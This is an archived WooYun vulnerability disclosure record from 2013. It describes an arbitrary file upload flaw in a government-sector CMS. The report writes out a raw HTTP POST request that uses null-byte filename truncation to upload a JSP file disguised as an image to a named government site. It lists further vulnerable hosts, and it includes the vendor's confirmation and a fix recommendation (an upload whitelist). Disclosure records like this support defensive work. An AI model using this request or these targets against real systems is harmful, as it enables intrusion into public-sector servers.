{"id": 5439, "wybug_id": "wooyun-2013-046091", "wybug_title": "某政务类CMS任意文件上传第二发（还是通用）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "wefgod", "wybug_date": "2013-12-16 11:52", "wybug_open_date": "2014-03-16 11:53", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查", "文件上传漏洞", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向公众公开  简要描述： 第一发：http://www.wooyun.org/bugs/wooyun-2013-046022 详细说明：  某一个action有点问题，可以用00截断截断文件名，然后……http://www.zjna.gov.cn/ecoi/upload.jsppost数据到http://www.zjna.gov.cn/ecoi/lee/upload.action   漏洞证明：  \n\n给一个POST的数据包的例子：\nPOST http://www.zjna.gov.cn/ecoi/lee/upload.action HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://www.zjna.gov.cn/ecoi/upload.jspAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)Content-Type: multipart/form-data; boundary=---------------------------7dd2153230498Accept-Encoding: gzip, deflateHost: www.zjna.gov.cnContent-Length: 6672Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=FCEF276BACDC937F1B084778CF26708C; IPUSH_TS=1387091997 -----------------------------7dd2153230498Content-Disposition: form-data; name=\"title\" a-----------------------------7dd2153230498Content-Disposition: form-data; name=\"upload\"; filename=\"div.jsp(00截断！).jpg\"Content-Type: image/gif\n\n\n看属性发现回显的是没截断的文件名：\n\n但是实际上已经截断上传成功：\n\n其它：http://61.132.27.71/ecoi/upload.jsp\n\n\n\n还有：http://218.90.166.129:8087/ecoi/upload.jsphttp://gcjs.danyang.gov.cn/ecoi/upload.jsp之类的&……   修复方案：  上传白名单   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-12-20 09:49 厂商回复： CNVD确认并复现所述情况，并在多个实例上确认通用性（主要用于江苏省相关部门），已经转由CNCERT下发给江苏分中心，由其后续联系网站管理单位处置，并建议网站管理单位联系软件开发厂商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-16 19:27 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  赞    \n     2013-12-20 10:10 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  核心 你好    \n     2013-12-20 10:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @在路上 别黑哦    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}